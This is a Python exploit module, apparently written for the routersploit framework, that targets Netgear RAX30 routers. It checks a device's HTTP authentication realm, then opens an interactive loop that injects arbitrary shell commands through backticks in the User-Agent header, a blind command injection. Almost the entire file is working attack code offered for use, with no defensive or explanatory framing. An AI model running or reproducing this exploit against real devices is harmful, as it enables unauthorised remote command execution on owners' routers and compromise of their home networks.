target = ""
# rsf exploit module
# title: Netgear RAX30 RCE
# description: Exploits RCE in Netgear RAX30 devices.
# author: ediop3

import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.session = requests.Session()

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            print("[*] Invoking command loop...")
            print("[*] It is blind command injection")
            self.shell()
        else:
            print("[-] Target is not vulnerable")

    def execute(self, cmd):
        headers = {"User-Agent": f"`{cmd}`"}
        try:
            self.session.get(
                f"http://{self.target}:{self.port}/",
                headers=headers,
                timeout=5
            )
        except:
            pass
        return ""

    def check(self):
        try:
            response = self.session.get(f"http://{self.target}:{self.port}/", timeout=5)
            if response:
                auth_header = response.headers.get('WWW-Authenticate', '')
                return 'Basic realm="RAX30"' in auth_header
        except:
            pass
        return False

    def shell(self):
        while True:
            try:
                cmd = input("shell> ")
                if cmd.lower() in ["exit", "quit"]:
                    break
                self.execute(cmd)
            except KeyboardInterrupt:
                break



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
